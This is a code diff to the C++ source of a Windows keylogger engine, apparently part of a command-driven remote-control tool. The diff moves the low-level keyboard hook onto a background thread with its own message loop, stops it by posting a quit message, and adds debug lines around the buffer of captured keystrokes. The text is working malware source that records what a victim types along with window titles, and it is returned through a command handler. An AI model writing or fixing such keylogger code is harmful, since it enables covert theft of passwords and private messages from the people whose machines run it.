@@ -65,8 +65,23 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 }
 
 bool KeyloggerEngine::init() {
-    keyloggerHook = SetWindowsHookExW(WH_KEYBOARD_LL, ::HookCallback, NULL, 0);
-    if(!keyloggerHook) return false;
+    std::thread([this]() {
+        hookThreadId = GetCurrentThreadId();
+        keyloggerHook = SetWindowsHookExW(WH_KEYBOARD_LL, ::HookCallback, NULL, 0);
+        if (!keyloggerHook) {
+            std::cerr << "Hook failed\n";
+            return;
+        }
+
+        MSG msg;
+        while (GetMessageW(&msg, NULL, 0, 0)) {
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        }
+
+        (void) UnhookWindowsHookEx(keyloggerHook);
+        keyloggerHook = nullptr;
+    }).detach();
     std::lock_guard<std::mutex> lock(bufferLock);
     buffer.clear();
     lastWindowTitle.clear();
@@ -74,9 +89,8 @@ bool KeyloggerEngine::init() {
 }
 
 void KeyloggerEngine::shouldStop() {
-    if (keyloggerHook) {
-        (void) UnhookWindowsHookEx(keyloggerHook);
-        keyloggerHook = nullptr;
+    if (hookThreadId != 0) {
+        PostThreadMessageW(hookThreadId, WM_QUIT, 0, 0);
     }
 }
 
@@ -126,7 +140,9 @@ void KeyloggerEngine::write(int keyStroke) {
 
         //Only try modifying the buffer.
         //It's ok to miss some key stroke to ensure deadlock-free
+        // std::cout << "beat\n";
         if(bufferLock.try_lock()) {
+            // std::cout << "Lock append buffer ok\n";
             buffer += tmpBuffer;
             bufferLock.unlock();
         }
@@ -134,7 +150,9 @@ void KeyloggerEngine::write(int keyStroke) {
 }
 
 std::string KeyloggerEngine::read() {
+    // std::cout << "Can i read?\n";
     std::lock_guard<std::mutex> lock(bufferLock);
+    // std::cout << "yes i can read?\n";
     return buffer;
 }
 
@@ -189,6 +207,8 @@ int DisableKeyloggerHandler(const Message& inputMessage, Message& outputMessage)
 
     KeyloggerEngine::getInstance().shouldStop();
     std::string capture = KeyloggerEngine::getInstance().read();
+
+    // std::cout << "DisableKeyloggerHandler debug: " << capture.size() << "\n";  
 
     outputMessage.commandNumber = MessageDisableKeylog;
     outputMessage.returnCode = 1;
